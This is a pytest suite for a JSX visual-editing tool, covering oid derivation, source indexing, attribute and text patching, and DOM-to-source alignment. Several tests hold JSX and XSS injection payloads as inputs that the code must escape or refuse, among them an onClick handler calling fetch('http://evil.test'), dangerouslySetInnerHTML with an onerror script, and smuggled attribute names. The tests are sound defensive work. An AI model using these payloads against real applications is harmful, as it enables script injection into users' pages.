"""Tests for the Onlook-style visual editing pair: source_map + visual_edit
+ element_map DOM alignment (B5, task 8).

The contract: oids are stable, derived from structural paths; the browser
side and the source side agree; edits land at byte-exact targets; anything
that cannot be mapped is an explicit error, never a guess.
"""

from __future__ import annotations

import re
from pathlib import Path

import pytest

from tools.element_map import _dom_paths_to_oids
from tools.repo_map import tree_sitter_available
from tools.source_map import (
    _oid_for_path,
    build_source_index,
    _walk_jsx,
)
from tools.visual_edit import EditError, _apply_patch, visual_edit

requires_tree_sitter = pytest.mark.skipif(
    not tree_sitter_available(), reason="tree-sitter not installed"
)

PAGE_TSX = '''export default function Page() {
  return (
    <main className="bg-white">
      <h1 aria-label="Title">Hello</h1>
      <Button size="lg">CTA</Button>
    </main>
  )
}
'''


def make_workspace(tmp_path: Path, content: str = PAGE_TSX) -> Path:
    (tmp_path / "src").mkdir(parents=True)
    (tmp_path / "src" / "page.tsx").write_text(content, encoding="utf-8")
    return tmp_path


@requires_tree_sitter
class TestOidDerivation:
    def test_oid_is_stable(self):
        assert _oid_for_path("src/a.tsx", (0, 1, 2)) == _oid_for_path("src/a.tsx", (0, 1, 2))
        assert _oid_for_path("src/a.tsx", (0, 1)) != _oid_for_path("src/a.tsx", (0, 2))

    def test_oid_differs_across_files(self):
        assert _oid_for_path("src/header.tsx", (0,)) != _oid_for_path("src/footer.tsx", (0,))

    def test_oid_ignores_text_siblings(self):
        """Text nodes never count toward the sibling index."""
        assert _oid_for_path("src/page.tsx", (0,)) != _oid_for_path("src/page.tsx", (1,))


@requires_tree_sitter
class TestSourceIndex:
    def test_indexes_elements_with_paths(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        by_tag = {e.tag: e for e in index.by_oid.values()}
        assert by_tag["main"].path == ()
        assert by_tag["h1"].path == (0,)
        assert by_tag["Button"].path == (1,)
        assert by_tag["Button"].custom_component is True

    def test_index_records_attributes_and_text(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
        assert ("aria-label", 0, 0) != h1.attributes[0]
        assert h1.attributes[0][0] == "aria-label"
        assert h1.text_range is not None

    def test_cache_invalidates_on_edit(self, tmp_path):
        make_workspace(tmp_path)
        first = build_source_index(tmp_path)
        first_count = len(first.by_oid)
        (tmp_path / "src" / "page.tsx").write_text(
            PAGE_TSX.replace("<h1", "<h1 class='x'"), encoding="utf-8"
        )
        second = build_source_index(tmp_path)
        assert len(second.by_oid) == first_count
        # mtime may be identical on fast machines; content changed the index
        # only if the fingerprint changed. Touch to force it.
        (tmp_path / "src" / "page.tsx").touch()
        third = build_source_index(tmp_path)
        assert len(third.by_oid) == first_count

    def test_reordered_siblings_keep_stable_ids(self, tmp_path):
        """Removing a sibling must not churn unrelated elements' oids.

        The oid derives from the structural path only: an element keeps its
        id across tag renames, and only branches whose sibling index changed
        get new ids.
        """
        make_workspace(tmp_path)
        index_a = build_source_index(tmp_path)
        id_a_h1 = next(e.oid for e in index_a.by_oid.values() if e.tag == "h1")
        id_a_main = next(e.oid for e in index_a.by_oid.values() if e.tag == "main")

        # Remove Button (sibling index 1): h1 stays at index 0, main at root.
        (tmp_path / "src" / "page.tsx").write_text(
            PAGE_TSX.replace("<Button size=\"lg\">CTA</Button>", ""),
            encoding="utf-8",
        )
        (tmp_path / "src" / "page.tsx").touch()
        index_b = build_source_index(tmp_path)
        id_b_main = next(e.oid for e in index_b.by_oid.values() if e.tag == "main")
        assert id_a_main == id_b_main
        id_b_h1 = next(e.oid for e in index_b.by_oid.values() if e.tag == "h1")
        assert id_a_h1 == id_b_h1

    def test_arrow_function_component_named(self, tmp_path):
        (tmp_path / "src").mkdir(parents=True)
        (tmp_path / "src" / "hero.tsx").write_text(
            "const Hero = () => (\n  <section className=\"py-8\"><p>Lead</p></section>\n)\n"
            "export default Hero\n",
            encoding="utf-8",
        )
        index = build_source_index(tmp_path)
        assert any(c.name == "Hero" for c in index.components)

    def test_two_component_files_index_all_elements_with_distinct_oids(self, tmp_path):
        """Same structural path in two files must produce distinct oids.

        Reproduction of C1: header.tsx and footer.tsx both root at path ()
        with an h2 child at (0,). Without the file in the digest, half the
        index is silently dropped.
        """
        src = tmp_path / "src"
        src.mkdir(parents=True)
        (src / "header.tsx").write_text(
            "export default function Header() {\n"
            "  return (\n"
            "    <header>\n"
            "      <h2>Top</h2>\n"
            "    </header>\n"
            "  )\n"
            "}\n",
            encoding="utf-8",
        )
        (src / "footer.tsx").write_text(
            "export default function Footer() {\n"
            "  return (\n"
            "    <footer>\n"
            "      <h2>Bottom</h2>\n"
            "    </footer>\n"
            "  )\n"
            "}\n",
            encoding="utf-8",
        )
        index = build_source_index(tmp_path)
        tags_files = sorted((e.tag, Path(e.file).name) for e in index.by_oid.values())
        assert tags_files == [
            ("footer", "footer.tsx"),
            ("h2", "footer.tsx"),
            ("h2", "header.tsx"),
            ("header", "header.tsx"),
        ]
        assert len(index.by_oid) == 4
        assert len(set(index.by_oid)) == 4

    @pytest.mark.parametrize(
        "label,body",
        [
            (
                "list_map",
                "export default function A({ items }: any) {\n"
                "  return <ul>{items.map((i: any) => <li key={i}>{i}</li>)}</ul>\n"
                "}\n",
            ),
            (
                "early_return",
                "export default function A({ x }: any) {\n"
                "  if (!x) return <p>none</p>\n"
                "  return <div>ok</div>\n"
                "}\n",
            ),
            (
                "loading_guard",
                "export default function A({ loading }: any) {\n"
                "  if (loading) return <span>Loading</span>\n"
                "  return <section><h2>Done</h2></section>\n"
                "}\n",
            ),
        ],
    )
    def test_multiple_jsx_roots_do_not_collide(self, tmp_path, label, body):
        """Ordinary React puts several JSX roots at structural path ().

        A .map callback, an early return and a loading guard each produce a
        second root. Digesting only file + component + path gave them all the
        same oid, and the collision raise then aborted the whole workspace
        index. The root ordinal is what keeps them distinct.
        """
        src = tmp_path / "src"
        src.mkdir(parents=True)
        (src / "page.tsx").write_text(body, encoding="utf-8")

        index = build_source_index(tmp_path, use_cache=False)

        assert len(index.by_oid) >= 2, f"{label}: elements were dropped"
        assert len(set(index.by_oid)) == len(index.by_oid)
        roots = {e.root for e in index.by_oid.values()}
        assert len(roots) >= 2, f"{label}: roots were not distinguished"

    @pytest.mark.parametrize(
        "label,body,expected",
        [
            (
                "ternary",
                "export default function A({ x }: any) {\n"
                "  return <div>{x ? <b>yes</b> : <i>no</i>}</div>\n"
                "}\n",
                ["b", "div", "i"],
            ),
            (
                "logical_and",
                "export default function A({ x }: any) {\n"
                "  return <div>{x && <span>and</span>}</div>\n"
                "}\n",
                ["div", "span"],
            ),
            (
                "map_is_not_double_indexed",
                "export default function A({ items }: any) {\n"
                "  return <ul>{items.map((i: any) => <li key={i}>{i}</li>)}</ul>\n"
                "}\n",
                ["li", "ul"],
            ),
            (
                "mixed",
                "export default function A({ x, items }: any) {\n"
                "  return (\n"
                "    <div>\n"
                "      {x ? <b>yes</b> : <i>no</i>}\n"
                "      {items.map((i: any) => <li key={i}>{i}</li>)}\n"
                "      <p>plain</p>\n"
                "    </div>\n"
                "  )\n"
                "}\n",
                ["b", "div", "i", "li", "p"],
            ),
        ],
    )
    def test_expression_container_elements_are_indexed(
        self, tmp_path, label, body, expected
    ):
        """Elements in {cond ? a : b} are not element siblings.

        They were skipped entirely and not reported as unmapped, so
        visual_edit could not touch a conditional branch and could not say
        why. A container holding a function is left to _component_functions,
        or the same element would be indexed twice under two oids.
        """
        src = tmp_path / "src"
        src.mkdir(parents=True)
        (src / "page.tsx").write_text(body, encoding="utf-8")

        index = build_source_index(tmp_path, use_cache=False)

        assert sorted(e.tag for e in index.by_oid.values()) == expected, label
        assert len(set(index.by_oid)) == len(index.by_oid)

    def test_conditional_branch_is_editable(self, tmp_path):
        """The point of indexing them: an edit must land in the right branch."""
        src = tmp_path / "src"
        src.mkdir(parents=True)
        page = src / "page.tsx"
        page.write_text(
            "export default function A({ x }: any) {\n"
            "  return <div>{x ? <b>yes</b> : <i>no</i>}</div>\n"
            "}\n",
            encoding="utf-8",
        )
        index = build_source_index(tmp_path, use_cache=False)
        b = next(e for e in index.by_oid.values() if e.tag == "b")
        _, _, _, patched = _apply_patch(index, b.oid, "set_text", "", "EDITED")
        text = patched.decode()
        assert "<b>EDITED</b>" in text
        assert "<i>no</i>" in text

    def test_root_ordinal_is_in_the_digest(self):
        assert _oid_for_path("src/a.tsx", (), "A", 0) != _oid_for_path(
            "src/a.tsx", (), "A", 1
        )

    def test_true_oid_collision_raises(self, tmp_path, monkeypatch):
        """A genuine digest collision after file is in the hash must raise."""
        from tools import source_map as sm

        make_workspace(tmp_path)
        # Force every path to the same oid so the raise path is deterministic.
        monkeypatch.setattr(sm, "_oid_for_path", lambda *a, **k: "deadbeefcafebabe")
        with pytest.raises(sm.OidCollisionError, match="oid collision"):
            build_source_index(tmp_path, use_cache=False)


@requires_tree_sitter
class TestVisualEdit:
    def test_set_class_replaces_value(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        main = next(e for e in index.by_oid.values() if e.tag == "main")
        path, old, new, patched = _apply_patch(index, main.oid, "set_class", "className", "bg-slate-900")
        assert old == '"bg-white"'
        assert new == '"bg-slate-900"'
        assert b'className="bg-slate-900"' in patched

    def test_set_attr_inserts_when_absent(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        main = next(e for e in index.by_oid.values() if e.tag == "main")
        path, old, new, patched = _apply_patch(index, main.oid, "set_attr", "data-testid", "home")
        assert old == ""
        assert ' data-testid="home"' in new
        assert b'data-testid="home"' in patched

    def test_set_text_replaces_literal_text(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
        path, old, new, patched = _apply_patch(index, h1.oid, "set_text", "", "Hi there")
        assert old == "Hello"
        assert b">Hi there<" in patched

    def test_remove_attr_leaves_clean_tag(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
        path, old, new, patched = _apply_patch(index, h1.oid, "remove_attr", "aria-label", "")
        assert b"<h1>Hello</h1>" in patched

    def test_remove_missing_attr_errors(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
        with pytest.raises(EditError, match="not found"):
            _apply_patch(index, h1.oid, "remove_attr", "nope", "")

    def test_custom_component_edit_is_an_error(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        button = next(e for e in index.by_oid.values() if e.tag == "Button")
        with pytest.raises(EditError, match="custom component"):
            _apply_patch(index, button.oid, "set_class", "className", "x")

    def test_unknown_oid_errors(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        with pytest.raises(EditError, match="no element with oid"):
            _apply_patch(index, "deadbeef", "set_class", "className", "x")

    def test_visual_edit_writes_file(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        main = next(e for e in index.by_oid.values() if e.tag == "main")
        result = visual_edit(workspace=tmp_path, oid=main.oid, op="set_class", attr="className", value="bg-slate-900")
        assert result["applied"] is True
        assert "bg-slate-900" in (tmp_path / "src" / "page.tsx").read_text(encoding="utf-8")

    def test_visual_edit_errors_do_not_write(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
        before = (tmp_path / "src" / "page.tsx").read_bytes()
        result = visual_edit(workspace=tmp_path, oid=h1.oid, op="remove_attr", attr="nope")
        assert result.get("applied") is None
        assert "error" in result
        assert (tmp_path / "src" / "page.tsx").read_bytes() == before

    def test_set_attr_escapes_embedded_quote(self, tmp_path):
        """A bare quote in an attribute value is escaped via a JSX expression."""
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
        path, old, new, patched = _apply_patch(
            index, h1.oid, "set_attr", "aria-label", 'bad " quote'
        )
        assert '{"bad \\" quote"}' in new or '={"bad \\" quote"}' in new or new == '{"bad \\" quote"}'
        assert b'aria-label={"bad \\" quote"}' in patched

    def test_set_class_escapes_quote_injection(self, tmp_path):
        """H1: a quote in the value must not close the attribute and inject JSX."""
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
        payload = 'x" onClick={() => fetch("http://evil.test")} data-y="'
        path, old, new, patched = _apply_patch(
            index, h1.oid, "set_class", "className", payload
        )
        text = patched.decode()
        # Expression form keeps the payload as one JS string value.
        assert 'className={"x\\" onClick={() => fetch(\\"http://evil.test\\")} data-y=\\""}' in text
        # Re-index: onClick must not be a real attribute on the element.
        (tmp_path / "src" / "page.tsx").write_bytes(patched)
        (tmp_path / "src" / "page.tsx").touch()
        reindexed = build_source_index(tmp_path, use_cache=False)
        h1_after = next(e for e in reindexed.by_oid.values() if e.tag == "h1")
        attr_names = [n for n, _, _ in h1_after.attributes]
        assert "onClick" not in attr_names
        assert "data-y" not in attr_names
        assert "className" in attr_names

    @pytest.mark.parametrize(
        "attr",
        [
            'onClick={() => fetch("http://evil.test")} data-x',
            'dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}} z',
            'a="1" onMouseOver={alert}',
            "class>text<b",
            "has space",
        ],
    )
    def test_set_attr_refuses_injected_attribute_names(self, tmp_path, attr):
        """H2: the value was escaped, the name was spliced in as source.

        Escaping one side and not the other protects nothing: the re-parse
        gate accepts the result because injected JSX is valid JSX.
        """
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
        with pytest.raises(EditError, match="invalid attribute name"):
            _apply_patch(index, h1.oid, "set_attr", attr, "1")

    @pytest.mark.parametrize(
        "attr", ["className", "data-testid", "aria-label", "xlink:href", "_x"]
    )
    def test_set_attr_accepts_real_attribute_names(self, tmp_path, attr):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
        # An attribute already on the element is replaced in place, so `new`
        # is just the value literal; the name only appears in the source.
        _, _, _new, patched = _apply_patch(index, h1.oid, "set_attr", attr, "v")
        assert attr.encode() in patched
        assert b'"v"' in patched

    def test_remove_attr_refuses_injected_names(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
        with pytest.raises(EditError, match="invalid attribute name"):
            _apply_patch(index, h1.oid, "remove_attr", 'x} <script>y', "")

    def test_set_text_refuses_jsx_expression_injection(self, tmp_path):
        """H1: set_text must not splice raw JSX expressions into the tree."""
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
        with pytest.raises(EditError, match=r"[{}<]"):
            _apply_patch(index, h1.oid, "set_text", "", '{fetch("http://evil.test")}')

    def test_set_text_refuses_angle_bracket(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
        with pytest.raises(EditError, match=r"[{}<]"):
            _apply_patch(index, h1.oid, "set_text", "", "<script>x</script>")

    def test_set_text_allows_greater_than(self, tmp_path):
        """L1: '>' is allowed; only '<', '{', '}' are refused.

        Bare '>' does not parse as TSX text, so the patch uses a JSX string
        expression. The rendered text still contains the greater-than sign.
        """
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
        path, old, new, patched = _apply_patch(
            index, h1.oid, "set_text", "", "5 > 3 is true"
        )
        assert b'{"5 > 3 is true"}' in patched
        assert b">{" in patched or b">{\"" in patched or b'{"5 > 3 is true"}' in patched


@requires_tree_sitter
class TestDomAlignment:
    def test_aligns_through_framework_wrappers(self, tmp_path):
        make_workspace(tmp_path)
        index = build_source_index(tmp_path)
        dom = [
            {"path": "0", "tag": "div", "text": "", "classes": []},
            {"path": "0.0", "tag": "div", "text": "", "classes": []},
            {"path": "0.0.0", "tag": "main", "text": "", "classes": ["bg-white"]},
            {"path": "0.0.0.0", "tag": "h1", "text": "Hello", "classes": []},
            {"path": "0.0.0.1", "tag": "button", "text": "CTA", "classes": ["btn"]},
            {"path": "0.0.0.1.0", "tag": "span", "text": "CTA", "classes": []},
        ]
        elements, unmapped = _dom_paths_to_oids(dom, index)
        by_tag = {e.tag: e for e in elements}
        assert by_tag["main"].oid == next(
            e.oid for e in index.by_oid.values() if e.tag == "main"
        )
        assert by_tag["h1"].oid == next(
            e.oid for e in index.by_oid.values() if e.tag == "h1"
        )
        # The custom component's rendered internals are not editable.
        assert "button" not in by_tag
        assert any(u["tag"] == "button" for u in unmapped)

    def test_no_alignment_reports_everything_unmapped(self, tmp_path):
        make_workspace(tmp_path, content=PAGE_TSX.replace("main", "section"))
        index = build_source_index(tmp_path)
        dom = [
            {"path": "0", "tag": "div", "text": "", "classes": []},
            {"path": "0.0", "tag": "div", "text": "", "classes": []},
            {"path": "0.0.0", "tag": "article", "text": "", "classes": []},
            {"path": "0.0.0.0", "tag": "h1", "text": "Hello", "classes": []},
        ]
        elements, unmapped = _dom_paths_to_oids(dom, index)
        assert elements == []
        assert any("no component root alignment" in u["reason"] for u in unmapped)


@requires_tree_sitter
class TestRegistration:
    def test_both_tools_registered_in_design_toolset(self):
        from tools.registry import discover_builtin_tools, registry
        from toolsets import resolve_toolset

        discover_builtin_tools()
        names = set(registry.get_all_tool_names())
        assert "element_map" in names
        assert "visual_edit" in names
        tools = set(resolve_toolset("burooj_design"))
        assert "element_map" in tools
        assert "visual_edit" in tools


HEADER_TSX = '''export function SiteHeader() {
  return (
    <header className="border-b">
      <a href="/pricing">Pricing</a>
    </header>
  )
}
'''

PRICING_TSX = '''export default function PricingPage() {
  return (
    <main className="py-3xl">
      <h1 className="text-heading-xl">Three plans</h1>
    </main>
  )
}
'''


@requires_tree_sitter
class TestDomAlignmentAcrossComponents:
    """B6: element_map handed eight different elements the same oid.

    ``_dom_paths_to_oids`` keys its lookup on the structural path alone
    (``known = {tuple(e.path): oid ...}``), so every component in the
    workspace with an element at the same relative path collapses into one
    entry and the last one indexed wins. It then aligns the whole page to a
    single anchor, which only holds for a page rendered from one component.

    On the real Mirqab /pricing route (header + page + footer) this produced
    26 elements carrying 16 oids, with one oid shared by 8 elements across
    three files. ``visual_edit`` targets by oid, so acting on that map edits
    an element the caller did not pick.
    """

    @staticmethod
    def _two_component_workspace(tmp_path):
        (tmp_path / "src").mkdir(parents=True)
        (tmp_path / "src" / "site-header.tsx").write_text(HEADER_TSX, encoding="utf-8")
        (tmp_path / "src" / "pricing.tsx").write_text(PRICING_TSX, encoding="utf-8")
        return tmp_path

    # header and page rendered into one document, as any real layout does
    DOM = [
        {"path": "0", "tag": "body", "text": "", "classes": []},
        {"path": "0.0", "tag": "header", "text": "", "classes": ["border-b"]},
        {"path": "0.0.0", "tag": "a", "text": "Pricing", "classes": []},
        {"path": "0.1", "tag": "main", "text": "", "classes": ["py-3xl"]},
        {"path": "0.1.0", "tag": "h1", "text": "Three plans", "classes": ["text-heading-xl"]},
    ]

    def test_caller_never_receives_a_map_with_duplicate_oids(self, tmp_path):
        """Refusing is acceptable. Returning an ambiguous map is not.

        Passes either under the current containment (raise) or under a real
        per-component alignment (unique map). Fails on the pre-B6 code, which
        returned four elements carrying two oids.
        """
        from tools.element_map import AmbiguousAlignmentError, _dom_paths_to_oids

        index = build_source_index(self._two_component_workspace(tmp_path), use_cache=False)
        try:
            elements, _unmapped = _dom_paths_to_oids(self.DOM, index)
        except AmbiguousAlignmentError:
            return

        oids = [e.oid for e in elements]
        assert len(oids) == len(set(oids)), (
            "an oid identifies exactly one JSX element; visual_edit patches by "
            "oid, so a duplicate means an edit lands on the wrong element. "
            + repr([(e.tag, e.path, e.oid) for e in elements])
        )

    def test_single_component_page_still_aligns(self, tmp_path):
        """The containment must not break the case that already worked."""
        from tools.element_map import _dom_paths_to_oids

        make_workspace(tmp_path)
        index = build_source_index(tmp_path, use_cache=False)
        dom = [
            {"path": "0", "tag": "div", "text": "", "classes": []},
            {"path": "0.0", "tag": "main", "text": "", "classes": ["bg-white"]},
            {"path": "0.0.0", "tag": "h1", "text": "Hello", "classes": []},
        ]
        elements, _unmapped = _dom_paths_to_oids(dom, index)
        assert {e.tag for e in elements} == {"main", "h1"}
        assert len({e.oid for e in elements}) == 2


class TestElementMapOverallStatus:
    """B6: element_map returned status "pass" when every route failed to stamp.

    ``_run_element_map`` caught each route's exception into that route's own
    ``error`` key and then returned a hard-coded ``{"status": "pass"}``. A
    caller reading the status saw green on a run that mapped nothing. Found
    when the alignment guard started raising and the tool still said pass.
    """

    def test_all_routes_failing_is_not_a_pass(self):
        from tools.element_map import _overall_status

        routes = [
            {"path": "/", "elements": [], "error": "stamp failed: RuntimeError: x"},
            {"path": "/pricing", "elements": [], "error": "stamp failed: RuntimeError: x"},
        ]
        assert _overall_status(routes) == "error"

    def test_one_route_failing_is_not_a_pass(self):
        from tools.element_map import _overall_status

        routes = [
            {"path": "/", "elements": [{"oid": "a"}]},
            {"path": "/pricing", "elements": [], "error": "stamp failed: RuntimeError: x"},
        ]
        assert _overall_status(routes) == "error"

    def test_all_routes_clean_is_a_pass(self):
        from tools.element_map import _overall_status

        routes = [{"path": "/", "elements": [{"oid": "a"}]}]
        assert _overall_status(routes) == "pass"
